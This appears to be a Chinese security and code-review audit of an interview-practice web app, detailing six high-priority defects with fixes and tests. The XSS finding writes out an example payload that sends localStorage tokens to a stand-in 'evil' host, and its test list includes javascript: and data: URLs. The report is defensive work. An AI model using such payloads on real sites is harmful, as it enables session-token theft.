## 0. 结论摘要

| 等级 | 数量 | 含义 |
|---|---:|---|
| **P0** | **0** | 无阻断性问题；无需在阶段二之前紧急处置 |
| **P1** | **6** | 影响安全边界或数据正确性，必须 100% 修复 |
| **P2** | **20** | 体验/健壮性缺陷，修复目标 ≥90% |
| **P3** | **25** | 记录在案，按余量处置 |

**本期 6 个 P1 中有 4 个是「代码写对了，但部署/调用方式让它没生效」**（P1-01 受信代理未配置、P1-03 登出请求不带 token、P1-05 线程池丢 SecurityContext、P1-02 守卫不看路由）。这类缺陷在单元测试全绿的情况下依然存在，也解释了为什么基线 1599 个后端测试、932 个前端测试全通过却仍有线上风险——测试覆盖的是「函数被调用时是否按预期工作」，而不是「真实链路里它是否被调用、调用时上下文还在不在」。

审查共剔除 **9 条误报**（见 §5），其中 3 条若照单全收会引入不必要的改动甚至降低安全性（例如给 `MeController` 加匿名兜底、给 `ResumeDocumentService` 加源码简历归属校验）。

## 1. P1 问题详情

### P1-01 生产未配置受信代理前缀 → 全站共用同一个"边缘 IP"限流桶

| 项 | 内容 |
|---|---|
| 严重级 | P1 · 安全可用性 |
| 位置 | `backend/src/main/java/com/example/interview/config/SecurityConfig.java:82`<br>`backend/src/main/java/com/example/interview/util/ClientIpUtil.java:55-66`<br>`backend/src/main/java/com/example/interview/controller/AuthController.java:99,102,182,267-280,293`<br>`render.yaml`（env 列表无 `APP_SECURITY_TRUSTED_PROXY_PREFIXES`） |
| 代码现状 | `ClientIpUtil.resolve()` 只在 `remoteAddr` 是私网/本机、或命中 `app.security.trusted-proxy-prefixes` 时才解析 `X-Forwarded-For`。该配置默认空串，`render.yaml` 也没注入。 |
| 真实链路 | 请求经 Render 边缘网关 → 容器内 `remoteAddr` 是**网关公网 IP**（非私网）→ `isTrustedProxy()` 为 false → 直接返回网关 IP。于是**全站所有用户**共用这一个 IP。 |
| 影响 | ① 登录限流按 IP 计数（`MAX_FAIL_COUNT=5`）：任意人连错 5 次密码，**全站登录被锁 5 分钟**（可被无成本反复触发，等于账号体系 DoS）；② 注册限流（`registerLimiter` 按 IP）同样被一个人吃满，新用户注册被拒；③ 日志里的客户端 IP 全是网关 IP，安全审计与封禁溯源失效。 |
| 根因 | 修复「伪造 XFF 绕过限流」时采用了白名单策略（正确），但当时代码注释所依赖的前提——"生产 remoteAddr 是公网边缘 IP"——没有落实到**部署配置**上。安全修复只做了代码侧，配置侧留了空。 |
| 修复方案 | **不改信任模型，只补配置 + 拆维度**：<br>① 通过真实请求取证 Render 边缘 IP 段（用 `/api/health` 返回体或新增一次性探针记录 `remoteAddr`，**先测量再写死**，不猜网段）；把结果写入 `APP_SECURITY_TRUSTED_PROXY_PREFIXES`（`render.yaml` + 线上环境变量）。<br>② 拆分限流维度：IP 维度只做**粗粒度防刷**（阈值提高到 50/5min，锁定时长 1min），账号维度保持 5 次严格锁定。这样即便网关 IP 取证失败退回保守策略，也不会出现"一人锁全站"。<br>③ 登录失败日志记录解析后 IP + 原始 XFF 头，便于后续校正。 |
| 验证 | 单测：`ClientIpUtilTest` 已有用例补充"公网 remoteAddr + 非受信前缀 → 忽略 XFF"与"命中前缀 → 取最右侧非受信项"。集成：MockMvc 模拟两条不同 XFF 走同一账号，断言账号锁生效但 IP 桶未共用。线上：两账号各错 3 次，互不影响。 |
| 备注 | 若 Render 边缘 IP 段无法取证（无官方文档，WebFetch 已失败），**保底方案 ② 独立成立**——它不依赖任何网段假设。 |

### P1-02 匿名访客在公开页（首页 `/`、404 页）切回标签页会被强制跳登录

| 项 | 内容 |
|---|---|
| 严重级 | P1 · 体验/转化 |
| 位置 | `frontend/src/utils/sessionGuard.ts:81-103`（`evaluateSessionRecovery` 只豁免 `/login`）<br>`frontend/src/utils/sessionGuard.ts:132-157`（`handleSessionRecovery`）<br>`frontend/src/main.ts:37`（无条件 `installSessionGuard()`）<br>`frontend/src/router/index.ts:6,31`（`/` 与 404 fallback 均 `requiresAuth: false`） |
| 现象 | 未登录访客打开首页 → 切到别的标签页 → 切回来 → **立即被跳到 `/login?expired=1&redirect=/`**，并提示"登录已过期"。 |
| 根因 | 守卫只判断「token 是否有效」，没判断「当前路由是否需要登录」。`localStorage` 里本来就没有 token，被判为 `redirect-login`。 |
| 影响 | 首屏访客、被分享链接打开的陌生人、点了 404 链接的用户，只要切一次标签页就被踢到登录页，且看到"登录已过期"的错误归因。对一个「求职者路过→注册」的产品，这是直接的用户流失点。 |
| 修复方案 | `evaluateSessionRecovery` 增加「当前路由是否公开」入参：<br>① 无 token 且当前路由 `requiresAuth === false` → 返回 `noop`（不跳转、不清 auth、不提示）；<br>② 有 token 但已失效 → 一律 `redirect-login`（公开页也清掉脏 token，但不提示"过期"，静默清理）；<br>③ `/login` 保持豁免。<br>路由表通过轻量映射函数注入（不引 vue-router 依赖到纯函数里，保持可测）。 |
| 验证 | `sessionGuard` 单测补齐矩阵：`/`+无 token → noop`、`/`+过期 token → 静默清理`、`/resume`+无 token → redirect、`/login`+无 token → noop`。浏览器：匿名开首页 → 切标签页 10s → 回来仍在首页。 |

### P1-03 登出未吊销服务端 token（JWT 在 24h 内仍然有效）

| 项 | 内容 |
|---|---|
| 严重级 | P1 · 安全 |
| 位置 | `frontend/src/App.vue:474-481`<br>`frontend/src/api/index.ts:196-200`（请求拦截器从 `localStorage` 读 token）<br>`backend/src/main/java/com/example/interview/controller/AuthController.java:319-325`（`logout` 仅在能取到 userId 时才 `incrementTokenVersion`） |
| 现象 | 点"退出登录"，前端确实回到登录页，但**服务端 token 没有失效**：`logout` 请求发出时本地 token 已被 `clearAuth()` 删掉，拦截器读不到 token，请求不带 `Authorization`，后端 `currentUserIdOrNull()` 为 null → 直接返回成功、不做任何吊销。 |
| 根因 | 异步时序 + 响应拦截器读取全局状态的组合缺陷：<br>```js
api.post('/api/auth/logout').catch(() => {})   // 异步，拦截器在微任务里读 localStorage
clearAuth()                                     // 同步，先删了 token
router.push('/login')
``` |
| 影响 | ① 在共享电脑/网吧/演示机上登出后，token 仍可被（浏览器历史、扩展、磁盘残留）取出复用至自然过期（24h）；② 用户修改密码时期望的"其他设备下线"只覆盖了改密路径，登出路径不覆盖；③ 配合 P1-01，一旦 token 泄露无法通过"我先登出"止损。 |
| 修复方案 | 前端：`logout()` 改为先显式取 token 传给请求头，再在 `.finally()` 里清理：<br>```js
const token = localStorage.getItem('token')
api.post('/api/auth/logout', null, { headers: token ? { Authorization: `Bearer ${token}` } : {} })
  .catch(() => {})
  .finally(() => { clearAuth(); router.push('/login') })
```<br>后端：`logout` 在取不到 userId 时返回 200 但不假装成功（日志 warn）；同时补一条「匿名注销」用例锁定行为。 |
| 验证 | 单测：mock axios，断言 logout 请求头含旧 token 且 `clearAuth` 在请求之后调用。集成：登出后用同一 token 调 `/api/auth/me` 必须 401（当前会 200）。 |

### P1-04 applyUrl 未做 scheme 校验 → `javascript:` 可在应用源执行（token 在 localStorage）

| 项 | 内容 |
|---|---|
| 严重级 | P1 · 安全（XSS） |
| 位置 | 写入侧：`backend/.../service/job/JobApplicationService.java:147,176`、`backend/.../service/job/ApplicationImportService.java:181`、`backend/.../service/job/JobAgentService.java:297-318`、`backend/.../service/job/HttpJobPlatformAdapter.java:185-207`<br>读取/渲染侧：`frontend/src/views/ApplicationView.vue:69,137,218`（`:href`）、`:810-818`（`window.open`） |
| 现象 | 岗位投递链接 `applyUrl` 从第三方源 JSON（`url`/`detailUrl`/`link`）、用户 Excel 导入、AI 生成三处进入库，**三处都没有协议白名单**；前端直接绑到 `:href` 和 `window.open`。 |
| 影响 | 恶意/被污染的岗位源投放 `javascript:fetch('//evil/'+localStorage.token)` → 用户点"去投递"即在**应用自身源**执行脚本，可直接窃取 JWT、以用户身份调用任意 API（含管理端若该用户是管理员）。Excel 导入路径让普通用户也能自造 payload 并分享文件。 |
| 根因 | 只做了长度校验（`500` 字符），把"URL 合法性"默认为上游可信；前端把 `href` 当纯展示属性。 |
| 修复方案 | 双层防御：<br>① 后端新增 `UrlSafety` 工具（`http`/`https` 且 host 非空），在**入库三处**统一调用，非法则置 null 并 warn（不整批失败）；<br>② 前端新增 `safeExternalUrl(url)`，`href`/`window.open` 前过滤，非法则禁用按钮并提示"该岗位链接不可信"；<br>③ 存量数据：启动时一次性清理任务（或管理端按钮）把非法 scheme 置空。 |
| 验证 | 后端参数化测试：`javascript:alert(1)`、`data:text/html,...`、`  javascript:`（前导空格）、`JaVaScRiPt:`（大小写）、`//evil.com`（协议相对，应补 https 或拒绝）、正常 `https://`。前端：渲染含 `javascript:` 的 applyUrl，断言不产生可点击 `<a href="javascript:">`。 |

### P1-05 用户自持 AI Key 在 Agent / 实时面试（SSE）全链路失效

| 项 | 内容 |
|---|---|
| 严重级 | P1 · 功能承诺未兑现（v1.53.0 卖点） |
| 位置 | `backend/.../controller/AgentController.java:53`（`Executors.newVirtualThreadPerTaskExecutor()`）、`:147`（`submit`）<br>`backend/.../service/agent/AgentService.java:221-224`（`Mono.fromRunnable(...).subscribeOn(boundedElastic())`）<br>`backend/.../controller/InterviewController.java:67,399,441-444`（同款虚拟线程 + `.stream()`）<br>`backend/.../ai/SelfKeyAwareChatModel.java:88-95`（`userChatModelOrNull()` 依赖 `SecurityContextHolder`）、`:156-158`（`stream()` **恒走平台模型**） |
| 现象 | 配置了自持 Key 的用户在「AI 助手」「实时面试提问」里仍然消耗平台额度；且流式接口完全不读用户 Key。 |
| 根因 | 两处独立缺陷叠加：<br>① **上下文丢失**：`newVirtualThreadPerTaskExecutor()` 创建的是裸线程，不继承 `SecurityContext`（`SecurityContextHolder` 默认 `MODE_THREADLOCAL`），异步任务里 `userChatModelOrNull()` 恒为 null。<br>② **流式分支遗漏**：`SelfKeyAwareChatModel.stream()` 直接 `return platformModel.stream(prompt)`，注释写着"当前没有流式 AI 调用"——但 InterviewView/AgentView 走的恰恰是 SSE 流式。 |
| 影响 | ① 用户付费自持 Key 的核心价值在两条主链路上不成立（且用户无从感知，只会觉得"我配了 Key 怎么还限流"）；② 平台额度被本应由用户承担的成本消耗，与 Render 750h 额度纪律直接冲突。 |
| 修复方案 | ① 用 `DelegatingSecurityContextExecutor`（或 `DelegatingSecurityContextAsyncTaskExecutor`）包装虚拟线程池，两处 controller 统一改用一个 `AsyncConfig` 提供的 bean；SSE 场景在 `submit` 前显式 `SecurityContextHolder.getContext()` 捕获、任务内 set/clear（`Mono` 的 `contextWrite` 不够，因为模型解析是命令式读取）。<br>② `SelfKeyAwareChatModel.stream()` 对称实现：解析到用户 Key 时 `return userModel.stream(prompt)`，并处理"流开始后 Key 失效"的降级。<br>③ 加断言：自持 Key 用户的请求日志标记 `keySource=user|platform`，可观测。 |
| 验证 | 单测：`SelfKeyAwareChatModelTest` 补 `stream()` 分支；`AgentServiceTest` 用 `DelegatingSecurityContextExecutor` 跑一次并断言捕获到 userId。集成：Mock 用户 Key → 调 Agent SSE → 断言调用的是用户模型（测试用 mock 计数）。**不依赖真实计费**。 |
| 备注 | 这条同时解释了基线里"为什么 v1.53.0 的自持 Key 测试全绿"：测试直接调 service（同线程），没有经过 controller 的线程池。 |

### P1-06 评估请求进行中切题，答案与评分会被写到「下一题」名下

| 项 | 内容 |
|---|---|
| 严重级 | P1 · 数据正确性 |
| 位置 | `frontend/src/views/InterviewView.vue:1037-1044`（await evaluate）<br>`:1058-1076`（await 之后继续读 `currentQ.value`）<br>`:1100-1113`（`nextQuestion`）<br>`template` 行 182 / 246（上一题/下一题/跳过按钮在 `evalLoading` 期间未禁用） |
| 现象 | 提交回答后（AI 评估通常 3-15s），用户点"下一题" → `currentQ` 已切换 → 评估返回后 `sessionEvals.push({ question: currentQ.value.question, ... })` 与 `POST /api/session/answer { questionId: currentQ.value.id }` 用的是**新题**的 id 与题干。 |
| 影响 | ① 历史回顾里 A 题的回答挂在 B 题下，评分与题目错配，复盘报告失真；② 用户真实作答记录丢失（该题永远"未作答"）；③ 这是一个**沉默的数据污染**，事后无法自动修复。 |
| 根因 | 在 `await` 边界之后重新读取了响应式的"当前题"，而不是在 `await` 之前快照。前端也没有"评估中禁止切题"的约束。 |
| 修复方案 | ① `submitAnswer()` 开头快照 `const answered = { id, question, category, difficulty, referenceAnswer }`，后续所有写入只用快照；<br>② `evalLoading` 期间禁用"上一题/下一题/跳过"（`:disabled`）+ `nextQuestion()` 内加 `if (evalLoading.value) return` 兜底（同 `submitAnswer` 已有的防并发写法）；<br>③ 评估返回后若检测到 `currentQ.id !== answered.id`，仍写快照，并在 UI 提示"已保存到第 N 题"。 |
| 验证 | `InterviewView` 单测：mock evaluate 延迟 100ms，在延迟内调用 `nextQuestion()`，断言 `POST /api/session/answer` 的 `questionId` 是旧题；断言按钮 disabled。 |
